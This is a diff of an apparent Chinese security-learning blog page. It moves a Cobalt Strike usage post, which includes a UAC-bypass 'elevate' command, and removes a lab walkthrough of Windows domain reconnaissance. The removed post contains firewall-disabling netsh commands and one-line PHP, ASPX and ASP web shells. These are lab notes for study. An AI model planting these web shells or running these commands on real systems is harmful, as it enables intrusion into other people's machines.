@@ -76,7 +76,7 @@
     
     
     
-    <article id="cobalt-strike" class="article article-type-cobalt" itemscope
+    <article id="post-红队靶场系列" class="article article-type-post" itemscope
   itemprop="blogPost" data-scroll-reveal>
 
   <div class="article-inner">
@@ -84,8 +84,8 @@
     <header class="article-header">
        
 <h2 itemprop="name">
-  <a class="article-title" href="/2020/09/25/strike/"
-    >cobalt strike</a
+  <a class="article-title" href="/2020/10/09/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/"
+    >红队靶场系列</a
   >
 </h2>
   
@@ -95,8 +95,8 @@
 
     
     <div class="article-meta">
-      <a href="/2020/09/25/strike/" class="article-date">
-  <time datetime="2020-09-25T13:03:33.000Z" itemprop="datePublished">2020-09-25</time>
+      <a href="/2020/10/09/%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/" class="article-date">
+  <time datetime="2020-10-09T07:17:46.000Z" itemprop="datePublished">2020-10-09</time>
 </a>
       
       
@@ -115,26 +115,7 @@
       
 
       
-      <p>Cobalt Strike 是一款非常成熟的渗透框架，这里主要记录下它常用的用法。</p>
-<p>使用方法：</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#部署团队服务器,可支持多人使用</span></span><br><span class="line">root@kali:~/tools/cobaltstrike4.<span class="number">0</span><span class="comment"># ./teamserver 192.168.126.33 ccc123123</span></span><br><span class="line">[*] Will use existing X509 certificate and keystore (<span class="keyword">for</span> SSL)</span><br><span class="line">Picked up _JAVA_OPTIONS: <span class="literal">-Dawt</span>.useSystemAAFontSettings=on <span class="literal">-Dswing</span>.aatext=true</span><br><span class="line">[+] Team server is up on <span class="number">50050</span></span><br><span class="line">[*] SHA256 hash of SSL cert is: e22556354f8564451d11ff1bba9a2d1b47ba889b5ec147267597dcd8b7a858ad</span><br><span class="line">[+] Listener: win7 started!</span><br><span class="line">[+] Listener: hongri5 started!</span><br><span class="line"></span><br><span class="line"><span class="comment">#运行，密码即之前设置的团队服务器密码</span></span><br><span class="line">root@kali:~/tools/cobaltstrike4.<span class="number">0</span><span class="comment"># ./start.sh </span></span><br><span class="line">Picked up _JAVA_OPTIONS: <span class="literal">-Dawt</span>.useSystemAAFontSettings=on <span class="literal">-Dswing</span>.aatext=true</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-
-
-<h2 id="后渗透模块介绍："><a href="#后渗透模块介绍：" class="headerlink" title="后渗透模块介绍："></a><strong>后渗透模块介绍：</strong></h2><p>Cobalt Strike 的后渗透模块，可用于<strong>信息收集、权限提升、端口扫描、端口转发、横向移动、持久化</strong>等</p>
-<h3 id="1-使用Elevate模块提升权限"><a href="#1-使用Elevate模块提升权限" class="headerlink" title="1.使用Elevate模块提升权限"></a>1.使用Elevate模块提升权限</h3><p>elevate [exploit] [listener]</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#此模块目前内置了uac-token-duplication和svc-exe模块，可以自行添加其它模块</span></span><br><span class="line">elevate uac<span class="literal">-token</span><span class="literal">-duplication</span> hongri5 <span class="comment">#用于bypassUAC</span></span><br></pre></td></tr></table></figure>
-
-
-
-
-
-<p><img src="/2020/09/25/strike/1.png" alt></p>
-
+      
       
       <!-- reward -->
       
@@ -710,6 +691,91 @@
 
 
 
+
+      
+      <!-- reward -->
+      
+    </div>
+    
+    
+      <!-- copyright -->
+      
+    <footer class="article-footer">
+      
+      
+
+    </footer>
+
+  </div>
+
+  
+
+  
+  
+  
+
+  
+
+</article>
+    
+    <article id="cobalt-strike" class="article article-type-cobalt" itemscope
+  itemprop="blogPost" data-scroll-reveal>
+
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h2 itemprop="name">
+  <a class="article-title" href="/2020/08/25/strike/"
+    >cobalt strike</a
+  >
+</h2>
+  
+
+    </header>
+    
+
+    
+    <div class="article-meta">
+      <a href="/2020/08/25/strike/" class="article-date">
+  <time datetime="2020-08-25T13:03:33.000Z" itemprop="datePublished">2020-08-25</time>
+</a>
+      
+      
+      
+      
+    </div>
+    
+
+    
+
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+
+
+      
+
+      
+      <p>Cobalt Strike 是一款非常成熟的渗透框架，这里主要记录下它常用的用法。</p>
+<p>使用方法：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#部署团队服务器,可支持多人使用</span></span><br><span class="line">root@kali:~/tools/cobaltstrike4.<span class="number">0</span><span class="comment"># ./teamserver 192.168.126.33 ccc123123</span></span><br><span class="line">[*] Will use existing X509 certificate and keystore (<span class="keyword">for</span> SSL)</span><br><span class="line">Picked up _JAVA_OPTIONS: <span class="literal">-Dawt</span>.useSystemAAFontSettings=on <span class="literal">-Dswing</span>.aatext=true</span><br><span class="line">[+] Team server is up on <span class="number">50050</span></span><br><span class="line">[*] SHA256 hash of SSL cert is: e22556354f8564451d11ff1bba9a2d1b47ba889b5ec147267597dcd8b7a858ad</span><br><span class="line">[+] Listener: win7 started!</span><br><span class="line">[+] Listener: hongri5 started!</span><br><span class="line"></span><br><span class="line"><span class="comment">#运行，密码即之前设置的团队服务器密码</span></span><br><span class="line">root@kali:~/tools/cobaltstrike4.<span class="number">0</span><span class="comment"># ./start.sh </span></span><br><span class="line">Picked up _JAVA_OPTIONS: <span class="literal">-Dawt</span>.useSystemAAFontSettings=on <span class="literal">-Dswing</span>.aatext=true</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h2 id="后渗透模块介绍："><a href="#后渗透模块介绍：" class="headerlink" title="后渗透模块介绍："></a><strong>后渗透模块介绍：</strong></h2><p>Cobalt Strike 的后渗透模块，可用于<strong>信息收集、权限提升、端口扫描、端口转发、横向移动、持久化</strong>等</p>
+<h3 id="1-使用Elevate模块提升权限"><a href="#1-使用Elevate模块提升权限" class="headerlink" title="1.使用Elevate模块提升权限"></a>1.使用Elevate模块提升权限</h3><p>elevate [exploit] [listener]</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#此模块目前内置了uac-token-duplication和svc-exe模块，可以自行添加其它模块</span></span><br><span class="line">elevate uac<span class="literal">-token</span><span class="literal">-duplication</span> hongri5 <span class="comment">#用于bypassUAC</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p><img src="/2020/08/25/strike/1.png" alt></p>
 
       
       <!-- reward -->
@@ -1443,140 +1509,6 @@
     <footer class="article-footer">
       
       
-
-    </footer>
-
-  </div>
-
-  
-
-  
-  
-  
-
-  
-
-</article>
-    
-    <article id="post-渗透实战学习" class="article article-type-post" itemscope
-  itemprop="blogPost" data-scroll-reveal>
-
-  <div class="article-inner">
-    
-    <header class="article-header">
-       
-<h2 itemprop="name">
-  <a class="article-title" href="/2020/04/23/%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E5%AD%A6%E4%B9%A0/"
-    >渗透实战学习</a
-  >
-</h2>
-  
-
-    </header>
-    
-
-    
-    <div class="article-meta">
-      <a href="/2020/04/23/%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E5%AD%A6%E4%B9%A0/" class="article-date">
-  <time datetime="2020-04-23T07:13:23.000Z" itemprop="datePublished">2020-04-23</time>
-</a>
-      
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/%E6%B8%97%E9%80%8F%E4%B9%8B%E8%B7%AF/">渗透之路</a>
-  </div>
-
-      
-      
-      
-    </div>
-    
-
-    
-
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-
-
-      
-
-      
-      <hr>
-<p>光看书不动手是无法更深刻理解的，一开始还是跟着大佬的步骤走，再自己复现一遍，尽可能搞懂每一步！</p>
-<h2 id="1-内网基础知识"><a href="#1-内网基础知识" class="headerlink" title="1.内网基础知识"></a>1.内网基础知识</h2><p><strong>工作组：</strong>在工作组中的网络可以互相访问对方的共享资源，主要按部门或者功能进行分组</p>
-<p><strong>域（Domain）：</strong>是一个有安全边界的计算机集合，可以理解为升级版的工作组，但域的安全管理控制机制更加严格。用户必须以合法的身份登录域，且用户的权限是根据用户在域中的身份决定的。</p>
-<p><strong>域控制器（DC）：</strong>可以理解为一个单位的门禁系统，负责所有连入的计算机和用户的验证工作</p>
-<p>域控制器存在这个域所有账户、密码等信息的数据库</p>
-<p>域中一般有以下几个环境：</p>
-<p><strong>单域：</strong>在一个地理位置固定的小公司，建立一个域就可以了。一般一个域至少两台域服务器，一个作为DC，另一台作为备份DC。</p>
-<p>父域和子域：第一个创建的域为父域，各分部的域称为该域的子域。例如一个大公司的各个分公司位于不同的地点，就需要用到父域和子域。因为在同一个域当中，信息交互是比较多的，而且不能压缩。而不同域信息交互比较少，而且可以压缩。同时也为了安全考虑，每个域都有自己的安全策略，比如财务部希望使用特定的安全策略（包括账号密码策略）</p>
-<p><strong>域树：</strong>是多个域通过建立信任关系组成的集合</p>
-<p>（父）abc.com —-asia.abc.com ——cn.asia.abc.com（子）</p>
-<p>abc.com—–europe.abc.com—–ft.asia.abc.com</p>
-<p>子域只能使用父域的名字作为其域名的后缀</p>
-<p><strong>域森林：</strong>多个域树建立信任关系组成的集合</p>
-<p>比如abc.com要合并abc.net，但无法挂下，所以需要建立信任关系来构成</p>
-<p><strong>域名服务器（Domain Name Server，DNS）：</strong>是指用于实现域名和与之相对应的IP地址转换的服务器</p>
-<p>域树的域名和DNS域名非常相似，实际上，因为域中的计算机是使用DNS来定位域控制器、服务器以及其他计算机、网络服务的，所以域的名字就是DNS域的名字。</p>
-<p><strong>在内网渗透中，大部分是通过寻找DNS服务器来确定域控制器的位置（这两者通常配值在一台机子上）</strong></p>
-<p><strong>活动目录：</strong>是指域环境中提供目录服务的组件</p>
-<p>域服务器和活动目录的区别：</p>
-<p><strong>安全域的划分：</strong>划分安全域的目的是将安全等级相同的计算机划入同一网段，该网段的计算机拥有相同的网络边界，并在网络边界部署防火墙实现对其它安全域的网络访问控制策略。</p>
-<p><strong>安全域一般分为DMZ和内网</strong></p>
-<p>在一个用路由器连接的内网中，分为安全级别最高的内网、中等的DMZ、最低的外网。三个区域任务不同，访问策略不同</p>
-<p><strong>DMZ称为隔离区</strong>，位于企业内部网络和外部网络之间。可以在其中放一些必须空开的服务器，如FTP、Web、论坛服务器</p>
-<p>在网络边界上一般会部署防火墙及入侵检测等，如果有Web应用还会设置WAF，从而有效保护内网。</p>
-<p>在配置一个拥有DMZ的网络时，通常需要定义如下访问控制策略，以实现屏障功能：</p>
-<p><strong>1.内网可以访问外网：</strong>在这一策略中，防火墙需要执行NAT</p>
-<p><strong>2.内网可以访问DMZ：</strong>内网用户可以管理DMZ中的服务器</p>
-<p><strong>3.外网不能访问内网：</strong>如果要访问，要通过VPN</p>
-<p><strong>4.外网可以访问DMZ：</strong>需要由防火墙来完成从对外地址到服务器实际地址的转换</p>
-<p><strong>5.DMZ不能访问内网、不能访问外网：</strong>保护内网</p>
-<p><strong>内网又可以划分为办公区和核心区：</strong></p>
-<p>办公区：公司员工日常的工作区，攻击者如果想进入内网，一般会使用<strong>鱼叉攻击、水坑攻击</strong>、社工等</p>
-<p>核心区：存储企业最重要的数据等信息资产，通过日志记录、安全审计等安全措施进行严密的保护</p>
-<p>一般来讲，能直接访问的只有运维人员或者IT部门的主管，所以攻击者会重点关注这些用户的信息</p>
-<p><strong>（攻击者在内网中进行横向移动攻击时，会优先查找这些主机）</strong></p>
-<p><strong>桥接模式：</strong>在桥接网络中，虚拟机是独立的机器。虚拟机和主机就好比插在同一台交换机上的两台计算机。如果主机连接到开启了DHCP服务的(无线)路由器上，虚拟机就可以自动获取IP地址，反之需要手动配值。只要IP地址在同一网段内，局域网内所有同网段的计算机就能够互访，这样虚拟机就可以上网了。</p>
-<p><strong>NAT模式(Network Address Translator):</strong>表示网络地址转换，虚拟机通过与物理机的连接来访问网络。虚拟机能够访问主机所在局域网内所有同网段的计算机，但是除了主机，局域网内的其它计算机都无法访问虚拟机。</p>
-<p><strong>Host-only模式:</strong>虚拟机处于一个独立的网段中，此模式下的虚拟机是无法上网的，但是可以通过windows提供的连接共享功能实现共享上网，主机能与所有虚拟机互访。如果没用开启windows的连接共享功能，除了主机，虚拟机与主机所在局域网内的所有其他计算机之间都无法访问。</p>
-<hr>
-<p>kail ip:192.168.126.1</p>
-<p>win7 ip:192.168.52.143  /   外网：192.168.126.128</p>
-<p>winK3 ip:192.168.52.141</p>
-<p>win2008: 密码改为hongri@2019  ip:192.168.52.138</p>
-<p>netstat -an 查看被打开的端口列表</p>
-<p>netstat -ano | findstr “80” 查看某个具体端口的占用情况</p>
-<p>tasklist | findstr “680”  查看具体哪个应用被占用了</p>
-<h2 id="2-内网信息收集"><a href="#2-内网信息收集" class="headerlink" title="2.内网信息收集"></a><strong>2.内网信息收集</strong></h2><h3 id="2-1-收集本机信息"><a href="#2-1-收集本机信息" class="headerlink" title="2.1 收集本机信息"></a><strong>2.1 收集本机信息</strong></h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /all 　　　　　  <span class="comment">#查询本机IP段，所在域等 </span></span><br><span class="line">systeminfo | findstr /B /C:<span class="string">"OS 名称"</span> /C:<span class="string">" OS 版本"</span> <span class="comment">#查询操作系统版本</span></span><br><span class="line">systeminfo | findstr /B /C:<span class="string">"OS Name"</span> /C:<span class="string">" OS VERSION"</span> <span class="comment">#英文版</span></span><br><span class="line">echo %PROCESSOR_ARCHITECTURE% <span class="comment">#查看系统体系结构  ---x86 、 amd64</span></span><br><span class="line">wmic service list brief <span class="comment">#查询本机服务信息</span></span><br><span class="line">tasklist | findstr <span class="string">"680"</span>  <span class="comment">#查看具体哪个应用被占用了,tasklist查看当前进程</span></span><br><span class="line">wmic <span class="keyword">process</span> list brief <span class="comment">#查看进程信息</span></span><br><span class="line">wmic startup get command,caption <span class="comment">#查看启动程序信息</span></span><br><span class="line">schtasks /query /fo LIST /v <span class="comment">#查看计划任务</span></span><br><span class="line">net statistics workstation <span class="comment">#查看主机开机时间</span></span><br><span class="line">net user 　　　　　　　   <span class="comment">#本机用户列表 ---可以分析内网机器的命名规则</span></span><br><span class="line">net localgroup administrators          <span class="comment">#本机管理员[通常含有域用户]</span></span><br><span class="line">query user || qwinsta  <span class="comment">#查看当前在线用户</span></span><br><span class="line">net session <span class="comment">#列出或断开本地计算机与所连接的客户端之间的会话</span></span><br><span class="line">netstat <span class="literal">-ano</span> <span class="comment">#查看所有占用端口的列表</span></span><br><span class="line">systeminfo <span class="comment">#查看系统的详细信息，需要注意系统的版本、补丁信息等</span></span><br><span class="line">wmic qfe get Caption,Description,HotFixID,Installedon <span class="comment">#查看安装在系统中的补丁</span></span><br><span class="line">net share <span class="comment">#查询本机共享列表和可访问的域共享列表</span></span><br><span class="line">route print</span><br><span class="line">arp <span class="literal">-a</span>  <span class="comment">#查询路由表以及所有可用接口的ARP缓存表</span></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">###查询防火墙相关配值###</span></span><br><span class="line">netsh firewall set opmode disable <span class="comment">#关闭防火墙 win2003及之前的版本</span></span><br><span class="line">netsh advfirewall set allprofiles state off <span class="comment">#之后的版本</span></span><br><span class="line">netsh firewall show config <span class="comment">#查看防火墙的配值</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="2-2查询当前权限"><a href="#2-2查询当前权限" class="headerlink" title="2.2查询当前权限"></a><strong>2.2查询当前权限</strong></h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">whoami <span class="comment">#查看当前权限</span></span><br><span class="line">whoami /all <span class="comment">#获取域SID</span></span><br><span class="line">net user 用户名 /domain   <span class="comment">#获取指定用户的账户信息</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="2-3判断是否存在域"><a href="#2-3判断是否存在域" class="headerlink" title="2.3判断是否存在域"></a><strong>2.3判断是否存在域</strong></h3><p>获得了本机的相关信息后，就要判断当前内网中是否存在域。<strong>如果当前内网中存在域，就需要判断所控主机是否在域内</strong></p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#查看本机是否和DNS服务器处于同一网段</span></span><br><span class="line">C:\phpStudy\WWW\yxcms\protected\apps\default\view\default&gt; ipconfig /all</span><br><span class="line">Windows IP 配置</span><br><span class="line">   主机名  . . . . . . . . . . . . . : stu1</span><br><span class="line">   主 DNS 后缀 . . . . . . . . . . . : god.org</span><br><span class="line">   节点类型  . . . . . . . . . . . . : 混合</span><br><span class="line">   IP 路由已启用 . . . . . . . . . . : 否</span><br><span class="line">   WINS 代理已启用 . . . . . . . . . : 否</span><br><span class="line">   DNS 后缀搜索列表  . . . . . . . . : god.org</span><br><span class="line"></span><br><span class="line"><span class="comment">#判断域控制服务器是否和DNS服务器在同一台服务器上</span></span><br><span class="line">C:\phpStudy\WWW\yxcms\protected\apps\default\view\default&gt; nslookup god.org</span><br><span class="line">非权威应答:</span><br><span class="line">服务器:  UnKnown</span><br><span class="line">Address:  <span class="number">192.168</span>.<span class="number">126.2</span></span><br><span class="line">名称:    god.org</span><br><span class="line">Addresses:  <span class="number">23.253</span>.<span class="number">58.227</span></span><br><span class="line">      <span class="number">176.34</span>.<span class="number">241.253</span></span><br><span class="line">      <span class="number">162.242</span>.<span class="number">150.89</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#查看域名、登录服务器为域控制器   如果域为WORKGROUP 表示当前服务器不在域内</span></span><br><span class="line">C:\phpStudy\WWW\yxcms\protected\apps\default\view\default&gt; systeminfo</span><br><span class="line">虚拟内存: 可用:   <span class="number">2</span>,<span class="number">765</span> MB</span><br><span class="line">虚拟内存: 使用中: <span class="number">1</span>,<span class="number">330</span> MB</span><br><span class="line">页面文件位置:     C:\pagefile.sys</span><br><span class="line">域:               god.org</span><br><span class="line">登录服务器:       \\OWA</span><br><span class="line"></span><br><span class="line">net config Workstation  <span class="comment">#当前计算机名，全名，用户名，系统版本，工作站域，登陆域 </span></span><br><span class="line"></span><br><span class="line"><span class="comment">#查询当前登录域及登录用户信息</span></span><br><span class="line">C:\phpStudy\WWW\yxcms&gt; net config Workstation</span><br><span class="line">计算机名                     \\STU1</span><br><span class="line">计算机全名                   stu1.god.org</span><br><span class="line">用户名                       Administrator</span><br><span class="line">工作站域                     GOD</span><br><span class="line">工作站域 DNS 名称            god.org  <span class="comment">###当前登录域名</span></span><br><span class="line">登录域                       GOD   <span class="comment">#此处表示当前用户是域用户还是本地，，这里表示域用户</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#判断主域</span></span><br><span class="line">net time /domain        <span class="comment">#查看时间服务器，判断主域，主域服务器都做时间服务器</span></span><br><span class="line">通常有三种情况：</span><br><span class="line">存在域，但当前用户不是域用户----拒绝访问</span><br><span class="line">存在域，且是--<span class="literal">-xx</span>的当前时间是xxx</span><br><span class="line">当前网络环境是工作组----找不到域xx的域控制器</span><br></pre></td></tr></table></figure>
-
-<h3 id="2-4探测域内存活主机"><a href="#2-4探测域内存活主机" class="headerlink" title="2.4探测域内存活主机"></a><strong>2.4探测域内存活主机</strong></h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">net user /domain        <span class="comment">#查看域用户</span></span><br><span class="line">net view /domain        <span class="comment">#查看有几个域</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">net group <span class="string">"domain computers"</span> /domain   <span class="comment">#查看域内所有的主机名 </span></span><br><span class="line">net group <span class="string">"domain admins"</span> /domain      <span class="comment">#查看域管理员 </span></span><br><span class="line">net group <span class="string">"domain controllers"</span> /domain <span class="comment">#查看域控</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">net group /domain                      <span class="comment">#查询域里面的工作组 </span></span><br><span class="line">net group 组名 /domain                  <span class="comment">#查询域中的某工作组</span></span><br></pre></td></tr></table></figure>
-
-
-
-<p>一句话木马：</p>
-<p>php一句话木马：<br>　　 <?php @eval($_POST[value]);?><br>　　<br>aspx一句话木马：<br>　　&lt;%@ Page Language=“Jscript”%&gt;<br>　　&lt;%eval(Request.Item[“value”])%&gt;<br>　　<br>asp一句话木马：<br>　　 &lt;%execute(request(“v”))%&gt;</p>
-
-      
-      <!-- reward -->
-      
-    </div>
-    
-    
-      <!-- copyright -->
-      
-    <footer class="article-footer">
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%B8%97%E9%80%8F/" rel="tag">渗透</a></li></ul>
-
 
     </footer>
 
